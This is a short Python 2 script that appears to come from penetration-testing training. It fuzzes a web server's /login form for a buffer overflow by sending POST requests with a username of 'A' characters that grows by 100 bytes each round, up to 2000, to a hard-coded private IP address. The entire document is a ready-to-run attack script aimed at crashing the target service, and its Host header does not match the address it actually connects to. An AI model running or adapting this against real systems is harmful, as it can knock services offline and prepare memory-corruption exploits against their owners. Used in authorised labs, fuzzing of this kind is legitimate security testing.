#!/usr/bin/python
import socket
import time                                                                                                                                                                                                                                
import sys                                                                                                                                                                                                                                 

                                                                                                                                                                                                                                           
size = 100                                                                                                                                                                                                                                 

# Attempting to send a buffer of A's in 100 character increments until it reaches 2000 characters. Change the while statement value below to increase the size.                                                                                                                                                                                                                                           
while(size < 2000):                                                                                                                                                                                                                        
 try:                                                                                                                                                                                                                                      
   print "\nSending buffer with %s bytes" % size                                                                                                                                                                                      
   inputBuffer = "A" * size                                                                                                                                                                                                                
                                                                                                                                                                                                                                           
   content = "username=" + inputBuffer + "&password=A"                                                                                                                                                                                     
   buffer = "POST /login HTTP/1.1\r\n"                                                                                                                                                                                                     
   buffer += "Host: 10.11.0.22\r\n"                                                                                                                                                                                                        
   buffer += "User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"                                                                                                                                         
   buffer += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
   buffer += "Accept-Language: en-US,en;q=0.5\r\n"
   buffer += "Referer: http://10.11.0.22/login\r\n"
   buffer += "Connection: close\r\n"
   buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
   buffer += "Content-Length: "+str(len(content))+"\r\n"
   buffer += "\r\n"

   buffer += content
   s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)

   s.connect(("192.168.223.10", 80))
   s.send(buffer)

   s.close()
   size += 100
   time.sleep(10)

 except:
   print "\nCould not connect"
   sys.exit()

